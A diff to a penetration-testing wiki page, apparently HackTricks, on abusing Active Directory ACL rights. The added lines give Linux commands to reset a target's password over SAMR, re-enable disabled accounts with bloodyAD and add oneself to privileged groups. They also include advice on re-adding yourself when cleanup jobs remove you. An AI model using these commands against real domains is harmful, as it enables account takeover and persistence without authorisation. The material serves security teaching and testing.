@@ -16,6 +16,19 @@ BadSuccessor.md
 This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:
 
 - **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
+- From Linux, you can do the same over SAMR with Samba `net rpc`:
+
+```bash
+# Reset target user's password over SAMR from Linux
+net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+```
+
+- **If the account is disabled, clear the UAC flag**: `GenericAll` allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:
+
+```bash
+bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
+```
+
 - **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.
 
 ```bash
@@ -29,6 +42,12 @@ Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipal
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
+
+- **Shadow Credentials / Key Credential Link**: With `GenericAll` on a user you can add a certificate-based credential and authenticate as them without changing their password. See:
+
+{{#ref}}
+shadow-credentials.md
+{{#endref}}
 
 ## **GenericAll Rights on Group**
 
@@ -131,6 +150,17 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
 
+- From Linux, Samba `net` can add/remove members when you hold `GenericWrite` on the group (useful when PowerShell/RSAT are unavailable):
+
+```bash
+# Add yourself to the target group via SAMR
+net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+# Verify current members
+net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
+```
+
+- Operational note: Group membership often gates access to resources such as SMB shares and WinRM/RDP rights. After adding yourself, access typically updates immediately (may require a new Kerberos TGT). If there is an automated cleanup job, you may have to re-add yourself.
+
 ## **WriteDACL + WriteOwner**
 
 Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
@@ -216,8 +246,9 @@ Furthermore, additional methods for executing code or maintaining persistence, s
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
+- [Samba – net rpc (group membership)](https://www.samba.org/)
+- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
